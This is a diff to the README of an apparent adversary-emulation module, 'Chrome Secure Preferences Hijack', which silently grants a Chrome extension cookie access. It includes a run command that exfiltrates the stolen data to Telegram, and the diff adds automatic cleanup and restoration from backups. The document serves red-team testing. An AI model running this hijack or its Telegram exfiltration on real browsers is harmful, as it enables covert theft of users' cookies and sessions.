@@ -1,7 +1,5 @@
 # Chrome Secure Preferences Hijack
 
-> **NOTE:** This TTP does not include any cleanup steps. It is expected that the user will manually clean up the changes made to the Chrome Secure Preferences file. This can be done by removing the extension from Chrome, reverting it to its original state.
-
 This TTP exploits a vulnerability in Chrome's Secure Preferences file to silently and persistently
 modify a Chrome extension, granting it additional permissions to access cookies and other sensitive data.
 
@@ -47,7 +45,8 @@ ttpforge run forgearmory//persistence/chrome-secure-preferences-hijack/chrome-se
 ```
 
 # Steps
-1. **exploit_chrome**: Exploits Chrome's Secure Preferences file to silently and persistently modify a Chrome extension, granting additional permissions to access cookies
+1. **exploit_chrome**: Exploits Chrome's Secure Preferences file to silently and persistently modify a Chrome extension, granting additional permissions to access cookies. Backups of all modified files are saved before changes.
+   - **cleanup**: Automatically restores all modified files from backups and removes injected artifacts.
 
 ## Manual Reproduction
 ```bash
@@ -55,6 +54,21 @@ ttpforge run forgearmory//persistence/chrome-secure-preferences-hijack/chrome-se
 
 src/main.py --id=gpaiobkfhnonedkhhfjpmhdalgeoebfa --wait-time=15 --exfil_method=telegram --telegram-token=<YOUR_TOKEN> --telegram-chat-id=<YOUR_CHAT_ID>
 ```
+
+## Cleanup
+
+Cleanup runs automatically via TTPForge after the exploit step completes. The cleanup script (`src/cleanup.py`) performs the following:
+
+1. Kills Chrome
+2. Restores `Secure Preferences` from backup
+3. Restores `manifest.json` from backup
+4. Restores the background script from backup
+5. Removes `dump.html` / `dump.js` if present (local exfil artifacts)
+6. Recalculates HMACs and `super_mac` for the restored Secure Preferences
+7. Removes the backup directory (`/tmp/chrome-hijack-backup-<extension_id>/`)
+8. Restarts Chrome
+
+Backups are created by `main.py` before any modifications and stored in `/tmp/chrome-hijack-backup-<extension_id>/`.
 
 ## MITRE ATT&CK Mapping
 - **Tactics**:
